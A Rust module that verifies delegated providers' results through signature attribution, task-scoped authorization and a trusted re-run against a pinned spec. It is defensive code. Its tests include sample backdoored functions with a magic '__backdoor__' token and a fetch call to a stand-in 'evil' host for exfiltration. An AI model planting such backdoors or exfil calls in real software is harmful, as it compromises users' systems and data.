//! Result integrity & the verification leash (ADR-E4).
//!
//! Two layers, and the design states the limit of the first **in the design, not a
//! footnote**:
//!
//! 1. **Attribution** ([`verify_attribution`]) proves *who claims* a result — the
//!    delegated act-as-agent signer, chained to G's sigchain. It is **mandatory** (an
//!    unsigned / wrong-signed / expired result is rejected) but **is NOT integrity**:
//!    the signer lives on the provider's box, so a valid signature proves origin-of-
//!    claim, never correctness (ADR-E4 D1).
//! 2. **A trust-proportional re-run** ([`verify_result`]) for the low-trust row: a
//!    **deterministic re-run in a TRUSTED DOMAIN — authorizer-side or a *disjoint*
//!    trusted provider, NEVER the producer (X-5) — against the authorizer's *pinned*
//!    spec, not the provider's shipped tests (X-6)**. The bar is equivalence at the spec
//!    level, not byte-identity. Any test-file change in the diff is split out and flagged
//!    (tests are spec); provenance records the producer so a later-discovered poison's
//!    descendants can be found and re-run (D4/D6). The integrity guarantee's real shape
//!    is **bound + audit + revoke**, not "detect every forgery up front".
//!
//! Quorum is deferred to v2 (it needs unsolved sybil-resistance); the v1 low-trust lever
//! is the single disjoint re-run (ADR-E4 D7).

use anyhow::Result;
use serde::{Deserialize, Serialize};

use crate::identity::custody::{self, Capability};
use crate::identity::sigchain::AuthorizedKeys;

use super::{ResultEnvelope, TrustLevel};

/// The verdict of authenticating *who produced* a result (ADR-E4 D1). `ok` true means
/// the result is attributable to `agent` via the provider `producer`'s delegated signer —
/// nothing about correctness.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct AttributionVerdict {
    pub ok: bool,
    pub agent: String,
    pub producer: String,
    /// A bounded reason code, never attacker prose: `attributed`,
    /// `unsigned-or-wrong-signed`, `ucan-invalid-or-expired`, `principal-mismatch`,
    /// `aud-mismatch`, `not-act-as-agent`, `producer-unresolved`.
    pub reason: String,
}

/// Verify a result's attribution (ADR-E4 D1) — *who* produced it, not *which task*.
///
/// Attribution = the act-as-agent UCAN verifies at `now` (so an **expired** UCAN is
/// rejected — the leash-elapsed case), is issued by `agent` (G) to `producer` (P),
/// grants `act-as-agent` for G, **and** the envelope signature verifies against the
/// producer's authorized signer set. An unsigned / wrong-signed / expired result fails
/// closed. The *task* scope (which task this write may land on) is the dedicated
/// [`authorize_graph_write`] gate — the FR-V4 blast-radius bound — kept separate so the
/// over-scope write to a different task is attributable but refused on scope.
pub fn verify_attribution(
    result: &ResultEnvelope,
    now: chrono::DateTime<chrono::Utc>,
    revoked: &[String],
    resolve_auth: &dyn Fn(&str) -> Result<AuthorizedKeys>,
) -> AttributionVerdict {
    let mut v = AttributionVerdict {
        ok: false,
        agent: result.agent.clone(),
        producer: result.producer.clone(),
        reason: String::new(),
    };

    // 1. The act-as-agent UCAN must verify (chain to G, not expired, not revoked).
    let verified = match custody::verify(&result.act_as_agent_ucan, now, revoked, resolve_auth) {
        Ok(ver) => ver,
        Err(_) => {
            v.reason = "ucan-invalid-or-expired".into();
            return v;
        }
    };
    // 2. The UCAN is issued by G (principal) to P (aud).
    if verified.principal != result.agent {
        v.reason = "principal-mismatch".into();
        return v;
    }
    if verified.aud != result.producer {
        v.reason = "aud-mismatch".into();
        return v;
    }
    // 3. The UCAN actually grants act-as-agent for G (not some unrelated capability).
    //    The task scope is enforced separately by `authorize_graph_write` (FR-V4).
    let grants_act_as_agent = verified.granted.abilities.iter().any(|a| {
        a.can == "act-as-agent" && a.with.starts_with(&format!("agent://{}", result.agent))
    });
    if !grants_act_as_agent {
        v.reason = "not-act-as-agent".into();
        return v;
    }
    // 4. The envelope signature verifies against the PRODUCER's authorized signer set
    //    (the delegated signer holding the UCAN). Unsigned/wrong-signed ⇒ rejected.
    let producer_auth = match resolve_auth(&result.producer) {
        Ok(a) => a,
        Err(_) => {
            v.reason = "producer-unresolved".into();
            return v;
        }
    };
    if result.verify_sig(&producer_auth).is_err() {
        v.reason = "unsigned-or-wrong-signed".into();
        return v;
    }

    v.ok = true;
    v.reason = "attributed".into();
    v
}

/// Authorize a graph write under a **task-scoped** graph-write UCAN (ADR-E3 D1, the
/// blast-radius bound). The UCAN must verify (chain to G, not expired/revoked), be
/// issued by `agent` to `producer`, and **permit `graph/write` on `graph://task/<task>`**.
/// A write to a *different* task fails here — the FR-C2/V4 confused-deputy bound.
pub fn authorize_graph_write(
    ucan: &Capability,
    agent: &str,
    producer: &str,
    task_id: &str,
    now: chrono::DateTime<chrono::Utc>,
    revoked: &[String],
    resolve_auth: &dyn Fn(&str) -> Result<AuthorizedKeys>,
) -> Result<()> {
    let verified = custody::verify(ucan, now, revoked, resolve_auth)?;
    if verified.principal != agent {
        anyhow::bail!("graph-write UCAN is not issued by agent {agent}");
    }
    if verified.aud != producer {
        anyhow::bail!("graph-write UCAN is not held by producer {producer}");
    }
    let want = format!("graph://task/{task_id}");
    if !verified.granted.permits("graph/write", &want) {
        anyhow::bail!(
            "graph-write UCAN does not permit a write to {want} — it is task-scoped \
             (blast-radius bound, FR-C2/V4). A write to another task is refused."
        );
    }
    Ok(())
}

// ── The re-run lever (ADR-E4 D3) ────────────────────────────────────────────────

/// Checkability class of a deliverable (ADR-E4 OQ2). Never let the weak case
/// masquerade as verified — a non-checkable low-trust result **escalates**, it is never
/// accepted on "the re-run found nothing".
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Checkability {
    Checkable,
    SemiCheckable,
    NonCheckable,
}

/// The authorizer's **pinned** acceptance spec (the trusted oracle, X-6). Held at the
/// authorizer, **never** taken from the returned diff.
///
/// The **real** oracle is the executable [`acceptance`](Self::acceptance) check: the
/// producer's implementation is materialized into a trusted workspace and the
/// authorizer's pinned test command is *actually run* — the verdict is **test-pass
/// equivalence**, not a substring match (the `exec-real-run` fix for audit-exec F6). When
/// no executable check is pinned, the legacy `required`/`forbidden` **substring oracle**
/// is the documented fallback (its blind spot — a backdoor the author did not enumerate —
/// is why the executable path exists, and is also why [`integrity_screen`] runs as a
/// shared backstop regardless).
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct PinnedSpec {
    pub task_id: String,
    /// Legacy substring oracle: every marker must be present (fallback only).
    #[serde(default)]
    pub required: Vec<String>,
    /// Legacy substring oracle: no marker may be present (fallback only).
    #[serde(default)]
    pub forbidden: Vec<String>,
    /// The **executable** acceptance check — the real re-run. When set, it supersedes the
    /// substring oracle.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub acceptance: Option<AcceptanceCheck>,
}

impl PinnedSpec {
    pub fn cid(&self) -> String {
        crate::identity::content_cid(&serde_json::to_value(self).expect("PinnedSpec serializes"))
    }
}

/// One file the authorizer seeds into the trusted re-run workspace before the acceptance
/// command runs — a harness, or a base source file the diff applies onto. Authorizer-owned
/// and content-addressed by the spec cid, so a provider cannot inject or tamper with it.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct SpecFixture {
    /// Relative path under the workspace.
    pub path: String,
    pub content: String,
}

/// The authorizer's **executable** acceptance check (ADR-E4 D3, the REAL re-run that
/// replaces the substring oracle). The producer's implementation work product (test-file
/// hunks already split out, X-6) is written into a fresh trusted workspace alongside the
/// authorizer's pinned [`fixtures`](Self::fixtures), then [`test_cmd`](Self::test_cmd) is
/// run there with `cwd` = the workspace. The deliverable passes **iff the command exits
/// 0** — genuine test-pass / eval-gate equivalence, compared by *behavior*, not bytes.
///
/// Everything here is the **authorizer's** (pinned, content-addressed, never the
/// provider's shipped tests), and the run happens in the **verifier's** domain (never the
/// producer's — the X-5 guard in [`verify_result`] enforces `verifier != producer`).
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct AcceptanceCheck {
    /// Relative path under the workspace to write the producer's implementation work
    /// product to before the run. Defaults to `work_product.patch`.
    #[serde(default = "default_artifact_path")]
    pub artifact_path: String,
    /// The pinned acceptance command, run with `cwd` = the trusted workspace and
    /// `WG_EXEC_WORKSPACE` / `WG_EXEC_ARTIFACT` in env. Pass ⇔ exit 0.
    pub test_cmd: String,
    /// Files seeded into the workspace before the run (a harness, base sources).
    #[serde(default)]
    pub fixtures: Vec<SpecFixture>,
    /// Wall-clock budget; an over-budget re-run fails closed (rejects, never accepts on a
    /// hung harness).
    #[serde(default = "default_rerun_timeout")]
    pub timeout_secs: u64,
}

fn default_artifact_path() -> String {
    "work_product.patch".to_string()
}

fn default_rerun_timeout() -> u64 {
    120
}

/// Split a unified diff into (implementation changes, test-file changes). Any hunk under
/// a path containing `test` (e.g. `tests/…`, `*_test.rs`) is a **test change**, separated
/// before any re-run so a provider-authored test can never become its own oracle (X-6).
pub fn split_test_changes(diff: &str) -> (String, Vec<String>) {
    let mut impl_part = String::new();
    let mut test_changes: Vec<String> = Vec::new();
    let mut cur_test = String::new();
    let mut in_test_file = false;
    for line in diff.lines() {
        // A new file header (`--- a/path` / `diff --git …`) switches the active file.
        if line.starts_with("--- ") || line.starts_with("diff --git ") {
            if in_test_file && !cur_test.is_empty() {
                test_changes.push(std::mem::take(&mut cur_test));
            }
            in_test_file = line.to_ascii_lowercase().contains("test");
        }
        let buf = if in_test_file {
            &mut cur_test
        } else {
            &mut impl_part
        };
        if !buf.is_empty() {
            buf.push('\n');
        }
        buf.push_str(line);
    }
    if in_test_file && !cur_test.is_empty() {
        test_changes.push(cur_test);
    }
    (impl_part, test_changes)
}

/// The **shared-reviewer** integrity backstop over the implementation diff. Returns a
/// bounded reason if the diff is poisoned, else `None`.
///
/// The pinned-spec re-run ([`rerun_against_pinned_spec`]) is a *substring oracle*: it
/// only catches the `forbidden` markers the authorizer thought to pin. This was the
/// "fake" exec integrity check. This screen runs the **same** decode-then-detect
/// reviewer the WG-Review gate and the fed S-5 scanner use
/// ([`crate::review::detect::analyze`]) over the implementation hunk, so a
/// malicious-but-correct diff — a backdoor token, a remote-exec, an exfil shape — is
/// caught even when the pinned spec missed it. Deterministic and total (no timeout),
/// so there is no fail-open window; a `reject` blocks acceptance.
pub fn integrity_screen(impl_part: &str) -> Option<&'static str> {
    let screen =
        crate::review::detect::analyze(crate::review::ContentClass::Ic2Artifact, impl_part);
    (screen.verdict >= crate::review::Verdict::Reject).then_some("review-rejected-poison")
}

/// The outcome of a trusted-domain re-run.
#[derive(Debug, Clone, PartialEq)]
pub struct RerunOutcome {
    /// Whether the deliverable passed the authorizer's acceptance check.
    pub passed: bool,
    /// How it was checked: `"executable-test"` (the real re-run) or `"substring-oracle"`
    /// (the legacy fallback).
    pub mode: &'static str,
    /// A bounded, ops-readable detail (never echoes attacker prose verbatim beyond a
    /// pinned marker name).
    pub detail: String,
}

/// Re-run the **implementation** (test changes already split out, X-6) against the
/// authorizer's **pinned** spec in a trusted workspace.
///
/// When the spec carries an executable [`AcceptanceCheck`], this **actually runs** the
/// pinned acceptance command over the materialized work product and reports test-pass
/// equivalence — the real re-run. Otherwise it falls back to the legacy substring oracle
/// (`required`/`forbidden`). Either way the verdict is independent of the provider's bytes
/// — the command/markers are the authorizer's.
pub fn rerun_against_pinned_spec(impl_part: &str, spec: &PinnedSpec) -> RerunOutcome {
    if let Some(acc) = &spec.acceptance {
        return rerun_executable(impl_part, acc);
    }
    // Legacy fallback: the substring oracle. Its blind spot (a backdoor the author did not
    // enumerate) is exactly why the executable path above exists; `integrity_screen` still
    // runs as the shared backstop on top of this.
    for req in &spec.required {
        if !impl_part.contains(req) {
            return RerunOutcome {
                passed: false,
                mode: "substring-oracle",
                detail: format!("missing required marker {req:?}"),
            };
        }
    }
    for bad in &spec.forbidden {
        if impl_part.contains(bad) {
            return RerunOutcome {
                passed: false,
                mode: "substring-oracle",
                detail: format!("forbidden marker {bad:?} present"),
            };
        }
    }
    RerunOutcome {
        passed: true,
        mode: "substring-oracle",
        detail: "all pinned markers satisfied".to_string(),
    }
}

/// Materialize the producer's implementation into a fresh trusted workspace, seed the
/// authorizer's fixtures, and **run the pinned acceptance command** there. Pass ⇔ exit 0.
/// Any harness/IO error fails **closed** (rejects — never accept on a broken re-run).
fn rerun_executable(impl_part: &str, acc: &AcceptanceCheck) -> RerunOutcome {
    let ws = match make_workspace() {
        Ok(w) => w,
        Err(e) => {
            return RerunOutcome {
                passed: false,
                mode: "executable-test",
                detail: format!("re-run workspace error (fail-closed): {e}"),
            };
        }
    };
    let result = materialize_and_run(&ws, impl_part, acc);
    let _ = std::fs::remove_dir_all(&ws);
    match result {
        Ok(true) => RerunOutcome {
            passed: true,
            mode: "executable-test",
            detail: "pinned acceptance test passed (exit 0)".to_string(),
        },
        Ok(false) => RerunOutcome {
            passed: false,
            mode: "executable-test",
            detail: "pinned acceptance test FAILED (non-zero exit)".to_string(),
        },
        Err(e) => RerunOutcome {
            passed: false,
            mode: "executable-test",
            detail: format!("re-run harness error (fail-closed): {e}"),
        },
    }
}

fn materialize_and_run(
    ws: &std::path::Path,
    impl_part: &str,
    acc: &AcceptanceCheck,
) -> Result<bool> {
    use std::process::Stdio;
    // Seed the authorizer's fixtures (harness, base sources) ...
    for f in &acc.fixtures {
        let p = ws.join(&f.path);
        if let Some(parent) = p.parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::write(&p, &f.content)?;
    }
    // ... then write the producer's implementation as data the test consumes.
    let artifact = ws.join(&acc.artifact_path);
    if let Some(parent) = artifact.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(&artifact, impl_part)?;

    let (shell, flag) = if cfg!(windows) {
        ("cmd", "/C")
    } else {
        ("sh", "-c")
    };
    let (child, _killer) = crate::platform_timeout::spawn_with_timeout(
        shell,
        |c| {
            c.arg(flag)
                .arg(&acc.test_cmd)
                .current_dir(ws)
                .env("WG_EXEC_WORKSPACE", ws)
                .env("WG_EXEC_ARTIFACT", &acc.artifact_path)
                .stdin(Stdio::null())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
        },
        acc.timeout_secs,
    )?;
    let out = child.wait_with_output()?;
    Ok(out.status.success())
}

/// A unique, process-local temp workspace for one re-run (no `tempfile` dep in lib code).
fn make_workspace() -> Result<std::path::PathBuf> {
    use std::sync::atomic::{AtomicU64, Ordering};
    static CTR: AtomicU64 = AtomicU64::new(0);
    let n = CTR.fetch_add(1, Ordering::Relaxed);
    let dir = std::env::temp_dir().join(format!("wg-exec-rerun-{}-{}", std::process::id(), n));
    // Start from a clean slate even if a stale dir with this name survived a crash.
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir)?;
    Ok(dir)
}

/// A re-run request (ADR-E4 D3). `verifier` MUST differ from `producer` (X-5) — a re-run
/// on the producing provider is theatre and the engine refuses it.
#[derive(Debug, Clone)]
pub struct VerifyRequest<'a> {
    pub result: &'a ResultEnvelope,
    pub producer: String,
    pub verifier: String,
    pub trust: TrustLevel,
    pub checkability: Checkability,
    pub pinned_spec: &'a PinnedSpec,
}

/// The integrity verdict (ADR-E4 D3/D4). `accepted` is the final integrity decision;
/// attribution alone **never** launders a forgery into acceptance.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct VerifyVerdict {
    pub accepted: bool,
    pub attribution_ok: bool,
    pub reran: bool,
    pub reran_on: String,
    /// True iff the re-runner is the producing provider (X-5 violation — a bug the engine
    /// refuses; never `true` in a returned verdict).
    pub reran_on_is_producer: bool,
    /// True iff the returned diff touches a test file (tests-are-spec; flagged for review).
    pub test_poisoning_flagged: bool,
    /// Provenance: which provider produced the artifact (D4 — the audit/revoke anchor).
    pub provenance_producer: String,
    /// How the re-run was performed: `"executable-test"` (the real re-run), or
    /// `"substring-oracle"` (legacy fallback), or `""` when no re-run ran. Surfaced so a
    /// real-vs-fallback re-run is visible at a glance.
    #[serde(default)]
    pub rerun_mode: String,
    /// A bounded, ops-readable detail of the re-run outcome.
    #[serde(default)]
    pub rerun_detail: String,
    /// A bounded reason code: `accepted`, `rerun-failed`, `attribution-failed`,
    /// `escalate-non-checkable`, `verifier-is-producer`.
    pub reason: String,
}

/// Apply the verification leash for the low-trust integrity row (ADR-E4 D3). Refuses
/// `verifier == producer` (X-5), runs attribution, splits + flags test changes, and
/// re-runs the implementation against the **pinned** spec in the trusted (verifier)
/// domain. A non-checkable deliverable **escalates** rather than accept on silence.
pub fn verify_result(
    req: &VerifyRequest,
    now: chrono::DateTime<chrono::Utc>,
    revoked: &[String],
    resolve_auth: &dyn Fn(&str) -> Result<AuthorizedKeys>,
) -> Result<VerifyVerdict> {
    // X-5: a re-run scheduled back onto the producer is a BUG the engine refuses.
    if req.verifier == req.producer {
        anyhow::bail!(
            "refusing to verify on the producing provider {} — a re-run vs the producer is \
             theatre (X-5); schedule it authorizer-side or on a disjoint trusted provider",
            req.producer
        );
    }

    let attribution = verify_attribution(req.result, now, revoked, resolve_auth);
    let (impl_part, test_changes) = split_test_changes(&req.result.work_product);
    let test_poisoning_flagged = !test_changes.is_empty();

    let mut verdict = VerifyVerdict {
        accepted: false,
        attribution_ok: attribution.ok,
        reran: false,
        reran_on: req.verifier.clone(),
        reran_on_is_producer: false,
        test_poisoning_flagged,
        provenance_producer: req.producer.clone(),
        rerun_mode: String::new(),
        rerun_detail: String::new(),
        reason: String::new(),
    };

    if !attribution.ok {
        verdict.reason = "attribution-failed".into();
        return Ok(verdict);
    }

    // Non-checkable ⇒ escalate (never accept on "the re-run found nothing", ADR-E4 D2/OQ2).
    if req.checkability == Checkability::NonCheckable {
        verdict.reason = "escalate-non-checkable".into();
        return Ok(verdict);
    }

    // Re-run the IMPLEMENTATION (test changes excluded) against the PINNED spec, in the
    // trusted (verifier) domain. The provider's "claims_tests_pass" is irrelevant — this
    // actually executes the authorizer's pinned acceptance check (or, for a legacy spec,
    // the substring oracle) and compares by equivalence.
    verdict.reran = true;
    let rerun = rerun_against_pinned_spec(&impl_part, req.pinned_spec);
    verdict.rerun_mode = rerun.mode.to_string();
    verdict.rerun_detail = rerun.detail.clone();
    if !rerun.passed {
        verdict.reason = "rerun-failed".into();
        return Ok(verdict);
    }

    // Shared-reviewer backstop: even when the (substring-oracle) pinned spec passes,
    // run the same decode-then-detect reviewer over the implementation to catch a
    // backdoor/exfil the spec did not enumerate. A reject blocks acceptance.
    if let Some(reason) = integrity_screen(&impl_part) {
        verdict.reason = reason.into();
        return Ok(verdict);
    }

    verdict.accepted = true;
    verdict.reason = "accepted".into();
    Ok(verdict)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn split_separates_test_files() {
        let diff = "\
--- a/src/auth.rs
+++ b/src/auth.rs
+fn check() { real() }
--- a/tests/auth_test.rs
+++ b/tests/auth_test.rs
-assert!(secure());
+// disabled";
        let (impl_part, tests) = split_test_changes(diff);
        assert!(impl_part.contains("src/auth.rs"));
        assert!(!impl_part.contains("disabled"));
        assert_eq!(tests.len(), 1);
        assert!(tests[0].contains("auth_test.rs"));
    }

    #[test]
    fn pinned_spec_catches_forbidden_marker() {
        let spec = PinnedSpec {
            task_id: "T".into(),
            required: vec!["verify(tok)".into()],
            forbidden: vec!["__backdoor__".into(), "evil".into()],
            acceptance: None,
        };
        let good = "fn check(t:&str)->bool{ verify(tok) }";
        let bad = "fn check(t:&str)->bool{ if t==\"__backdoor__\" {true} else { verify(tok) } }";
        let g = rerun_against_pinned_spec(good, &spec);
        assert!(g.passed);
        assert_eq!(g.mode, "substring-oracle");
        assert!(!rerun_against_pinned_spec(bad, &spec).passed);
    }

    #[test]
    fn integrity_screen_catches_backdoor_the_spec_missed() {
        // A diff that PASSES a weak pinned spec (the substring oracle has no marker
        // for this backdoor) but plants a magic-value short-circuit + a remote exfil.
        let impl_part = "+fn check(t:&str)->bool{ if t==\"__backdoor__\" {return true;} \
                         let _=fetch(\"http://evil/x\"); verify(t) }";
        let weak_spec = PinnedSpec {
            task_id: "T".into(),
            required: vec![],
            forbidden: vec![],
            acceptance: None,
        };
        // The substring oracle is fooled ...
        assert!(
            rerun_against_pinned_spec(impl_part, &weak_spec).passed,
            "weak pinned spec passes the poisoned diff (substring oracle blind spot)"
        );
        // ... but the shared reviewer backstop catches it.
        assert_eq!(integrity_screen(impl_part), Some("review-rejected-poison"));
        // And a legitimate diff passes the screen (no over-block).
        assert_eq!(
            integrity_screen("+fn check(t:&str)->bool{ verify(t) }"),
            None
        );
    }

    /// The REAL re-run (the `exec-real-run` fix): the authorizer pins an EXECUTABLE
    /// acceptance test that is actually run over the producer's implementation in a
    /// trusted workspace. The test catches a backdoor by *behavior* (the genuine `check`
    /// agrees with `verify`; the corrupt one short-circuits `__backdoor__` to true) — not
    /// by a substring the author had to anticipate.
    #[cfg(unix)]
    #[test]
    fn executable_rerun_runs_pinned_test_passes_genuine_fails_corrupt() {
        let acc = AcceptanceCheck {
            artifact_path: "work_product.sh".to_string(),
            // Source the produced `check` and assert its BEHAVIOR matches the spec.
            test_cmd: ". ./work_product.sh\n\
                       check GOODTOKEN || exit 1\n\
                       check __backdoor__ && exit 1\n\
                       check NOPE && exit 1\n\
                       exit 0"
                .to_string(),
            fixtures: vec![],
            timeout_secs: 30,
        };
        let spec = PinnedSpec {
            task_id: "T".into(),
            required: vec![],
            forbidden: vec![],
            acceptance: Some(acc),
        };
        let genuine = "check() { [ \"$1\" = \"GOODTOKEN\" ]; }\n";
        let corrupt =
            "check() { [ \"$1\" = \"__backdoor__\" ] && return 0; [ \"$1\" = \"GOODTOKEN\" ]; }\n";

        let g = rerun_against_pinned_spec(genuine, &spec);
        assert!(
            g.passed,
            "genuine implementation should pass the re-run: {g:?}"
        );
        assert_eq!(g.mode, "executable-test");

        let c = rerun_against_pinned_spec(corrupt, &spec);
        assert!(
            !c.passed,
            "backdoored implementation must FAIL the re-run: {c:?}"
        );
        assert_eq!(c.mode, "executable-test");
    }

    /// A harness that cannot run fails CLOSED — a broken verifier rejects, never accepts on
    /// silence.
    #[cfg(unix)]
    #[test]
    fn executable_rerun_fails_closed_on_harness_error() {
        let acc = AcceptanceCheck {
            artifact_path: "work_product.sh".to_string(),
            test_cmd: "this_command_does_not_exist_anywhere_42".to_string(),
            fixtures: vec![],
            timeout_secs: 30,
        };
        let spec = PinnedSpec {
            task_id: "T".into(),
            required: vec![],
            forbidden: vec![],
            acceptance: Some(acc),
        };
        assert!(!rerun_against_pinned_spec("anything", &spec).passed);
    }

    #[test]
    fn verify_refuses_same_provider_rerun() {
        let spec = PinnedSpec {
            task_id: "T".into(),
            required: vec![],
            forbidden: vec![],
            acceptance: None,
        };
        // Build a minimal dummy result (attribution won't be reached — the X-5 guard fires
        // first). We can use Default-ish via a hand-built envelope.
        let result = dummy_result("wgid:zP", "wgid:zG", "T");
        let req = VerifyRequest {
            result: &result,
            producer: "wgid:zP".into(),
            verifier: "wgid:zP".into(), // SAME as producer — must be refused
            trust: TrustLevel::Provisional,
            checkability: Checkability::Checkable,
            pinned_spec: &spec,
        };
        let err = verify_result(&req, now(), &[], &|_| anyhow::bail!("unused")).unwrap_err();
        assert!(err.to_string().contains("producing provider"), "{err}");
    }

    fn now() -> chrono::DateTime<chrono::Utc> {
        chrono::DateTime::parse_from_rfc3339("2026-06-26T12:00:00Z")
            .unwrap()
            .with_timezone(&chrono::Utc)
    }

    fn dummy_result(producer: &str, agent: &str, task: &str) -> ResultEnvelope {
        ResultEnvelope {
            v: crate::identity::ENVELOPE_V,
            alg: crate::identity::ALG_ED25519.to_string(),
            exec_compat: super::super::WG_EXEC_COMPAT_VERSION.to_string(),
            task_id: task.to_string(),
            agent: agent.to_string(),
            producer: producer.to_string(),
            epoch: 1,
            work_product: String::new(),
            claims_tests_pass: false,
            usage: super::super::Usage::default(),
            act_as_agent_ucan: dummy_cap(agent, producer),
            graph_write_ucan: dummy_cap(agent, producer),
            created_at: now().to_rfc3339(),
            sig: String::new(),
        }
    }

    fn dummy_cap(agent: &str, producer: &str) -> Capability {
        Capability {
            v: crate::identity::ENVELOPE_V,
            alg: crate::identity::ALG_ED25519.to_string(),
            iss: agent.to_string(),
            aud: producer.to_string(),
            scope: custody::Scope::new(vec![]),
            not_before: now().to_rfc3339(),
            expires: (now() + chrono::Duration::seconds(3600)).to_rfc3339(),
            nonce: "00".into(),
            proof: None,
            sig: String::new(),
        }
    }
}
